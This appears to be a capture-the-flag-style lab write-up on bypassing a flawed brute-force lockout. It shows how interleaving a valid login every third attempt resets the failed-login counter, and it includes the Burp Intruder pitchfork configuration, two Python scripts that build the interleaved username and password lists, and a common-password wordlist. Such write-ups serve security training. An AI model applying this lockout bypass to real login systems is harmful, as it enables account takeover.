   Broken bruteforce protection 

It is highly likely that a brute-force attack will involve many failed guesses before the attacker successfully compromises an account. Logically, brute-force protection revolves around trying to make it as tricky as possible to automate the process and slow down the rate at which an attacker can attempt logins. The two most common ways of preventing brute-force attacks are:

    Locking the account that the remote user is trying to access if they make too many failed login attempts
    Blocking the remote user's IP address if they make too many login attempts in quick succession

Both approaches offer varying degrees of protection, but neither is invulnerable, especially if implemented using flawed logic. 



POC: 
1. login with a valid id ( the lab provided one "wiener", if there is none, then you create a new one), then log out, and try again with the valid username but incorrecct password. it was discovered that The website blocked any login attemt if three incorrect combinations were tried.  Then i have to wait for a minute before i can attempt to login again. But if i attept to login twice with incorrect passwoord, and on the thrid attept, i use a correct password, it will log me in, and reset the bruteforce counter to zero. this means that using burpsuite an attacker can bruteforce twice with a correct username, ad incorrect password, then on the third attempt, use a valid credential which will login and reset the counter to zero. this can then go on for long untl till the bruteforce is done.

image showing that i have been blocked after three incorrect attempts
![image](https://github.com/user-attachments/assets/85e9b13f-d035-4091-b8d7-b050d5e1322d)


2. To carry out the brutforce, the lab environment provided a valid username (carlos) and a password list, and the aim is to bruteforce until we get the valid password. remember that the login attempt will be blocked on the thrid incorrect attempt. a login request was sent to burp inruder, and the pitchfork option was selected. Then two payload position, username and passwords were added. The resoure pool was set to 1 concurret request. The username  payload was generated to contain "carlos, carlos, wiener" using the code below. This was done to ensure that burp will try the username carlos two times with different password, and on the third attempt, the username "wiener" will be tried with the correct password, therby rseting the counter to zero before the username "carlos" will be tried twice again...

 # Define the repeating pattern
pattern = ["carlos", "carlos", "wiener"]
   
# Calculate how many full repetitions we can have in 100 words
full_repeats = 100 // len(pattern)  # This gives 33 full repeats (99 words)
remainder = 100 % len(pattern)      # 1 word left

# Create the wordlist
wordlist = pattern * full_repeats + pattern[:remainder]

# Optional: print or save to file
print(" ".join(wordlist))

# To save to a file:
with open("wordlist.txt", "w") as f:
    f.write(" ".join(wordlist))

The payload is now 

                  carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wienercarlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos


Also the payload for the password position was generated to contain the paassword for "wiener" account at every third entry "peter" by modifying the payload the website gave using the following code


            #!/usr/bin/python3
with open('original_wordlist.txt', 'r') as f:
    words = f.read().splitlines()

output = []
for i in range(0, len(words), 2):
    output.append(words[i])
    if i + 1 < len(words):
        output.append(words[i + 1])
    output.append('peter')

with open('modified_wordlist.txt', 'w') as f:
    for word in output:
        f.write(word + '\n')


and it gave this final wordlist          

123456
password
peter
12345678
qwerty
peter
123456789
12345
peter
1234
111111
peter
1234567
dragon
peter
123123
baseball
peter
abc123
football
peter
monkey
letmein
peter
shadow
master
peter
666666
qwertyuiop
peter
123321
mustang
peter
1234567890
michael
peter
654321
superman
peter
1qaz2wsx
7777777
peter
121212
000000
peter
qazwsx
123qwe
peter
killer
trustno1
peter
jordan
jennifer
peter
zxcvbnm
asdfgh
peter
hunter
buster
peter
soccer
harley
peter
batman
andrew
peter
tigger
sunshine
peter
iloveyou
2000
peter
charlie
robert
peter
thomas
hockey
peter
ranger
daniel
peter
starwars
klaster
peter
112233
george
peter
computer
michelle
peter
jessica
pepper
peter
1111
zxcvbn
peter
555555
11111111
peter
131313
freedom
peter
777777
pass
peter
maggie
159753
peter
aaaaaa
ginger
peter
princess
joshua
peter
cheese
amanda
peter
summer
love
peter
ashley
nicole
peter
chelsea
biteme
peter
matthew
access
peter
yankees
987654321
peter
dallas
austin
peter
thunder
taylor
peter
matrix
mobilemail
peter
mom
monitor
peter
monitoring
montana
peter
moon
Moscow


and the attack commenced....


picture showing the request on burp intruder
![image](https://github.com/user-attachments/assets/70875ba4-acd2-4a1b-8586-1f28dd30ff9c)



The bruteforce was successful, as all the payloads that had weiner and her password responded back with 302, and the a single payload that contains carlos, and the rght passwword also returned 302 




Picture showing the success
![image](https://github.com/user-attachments/assets/4ac4b225-5010-48a7-9ba2-a16238f7d9d9)
